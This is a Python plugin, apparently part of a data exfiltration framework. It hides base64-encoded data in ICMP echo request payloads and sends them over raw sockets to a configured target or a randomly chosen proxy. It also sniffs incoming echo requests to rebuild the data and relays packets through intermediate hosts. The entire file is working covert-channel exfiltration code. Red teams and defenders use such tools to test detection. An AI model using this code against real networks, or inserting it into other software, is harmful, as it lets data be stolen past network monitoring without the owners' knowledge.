import base64
import socket
from random import choice, randint
from dpkt import ip, icmp
import traceback
import sys

config = None
app_exfiltrate = None

def send_icmp(dst, data):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except Exception:
        traceback.print_exc()
        app_exfiltrate.log_message('warning', "ICMP plugin requires root privileges")
        sys.exit()
    ip_dst = socket.gethostbyname(dst)
    echo = icmp.ICMP.Echo()
    echo.id = randint(0, 0xffff)
    echo.seq = 1
    echo.data = data.encode()
    icmp_pkt = icmp.ICMP()
    icmp_pkt.type = icmp.ICMP_ECHO
    icmp_pkt.data = echo
    try:
        s.sendto(icmp_pkt.pack(), (ip_dst, 0))
    except Exception:
        traceback.print_exc()
        app_exfiltrate.log_message('warning', "ICMP plugin requires root privileges")
        pass
    s.close()

def send(data):
    if 'proxies' in config and config['proxies'] != [""]:
        targets = [config['target']] + config['proxies']
        target = choice(targets)
    else:
        target = config['target']
    data = base64.b64encode(data.encode()).decode()
    app_exfiltrate.log_message(
        'info', "[icmp] Sending {0} bytes with ICMP packet to {1}".format(len(data), target))
    send_icmp(target, data)

def listen():
    app_exfiltrate.log_message('info', "[icmp] Listening for ICMP packets..")
    # Filter for echo requests only to prevent capturing generated replies
    sniff(handler=analyze)

def sniff(handler):
    """ Sniffs packets and looks for icmp requests """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.bind(('0.0.0.0', 1))
    except PermissionError:
        app_exfiltrate.log_message(
            'warning', '[icmp] ICMP plugin requires root privileges, stopping'
            )
        return
    while True :
        try:
            data = sock.recv(65535)
            ip_pkt = ip.IP()
            ip_pkt.unpack(data)
            icmp_pkt = ip_pkt.data
            if icmp_pkt.type == icmp.ICMP_ECHO:
                ip_src = socket.inet_ntoa(ip_pkt.src)
                ip_dst = socket.inet_ntoa(ip_pkt.dst)
                payload = icmp_pkt.data.data
                handler(payload, ip_src, ip_dst)
        except:
            sock.close()

def analyze(payload, src, dst):
    try:
        app_exfiltrate.log_message(
            'info', "[icmp] Received ICMP packet from {0} to {1}".format(src, dst))
        app_exfiltrate.retrieve_data(base64.b64decode(payload).decode())
    except:
        pass

def relay_icmp_packet(payload, src, dst):
    target = config['target']
    try:
        app_exfiltrate.log_message(
                'info', "[proxy] [icmp] Relaying icmp packet to {0}".format(target))
        send_icmp(target, payload)
    except:
        pass

def proxy():
    app_exfiltrate.log_message(
            'info', "[proxy] [icmp] Listening for icmp packets")
    sniff(handler=relay_icmp_packet)

class Plugin:
    def __init__(self, app, conf):
        global app_exfiltrate, config
        app_exfiltrate = app
        config = conf
        app.register_plugin('icmp', {'send': send, 'listen': listen, 'proxy': proxy})
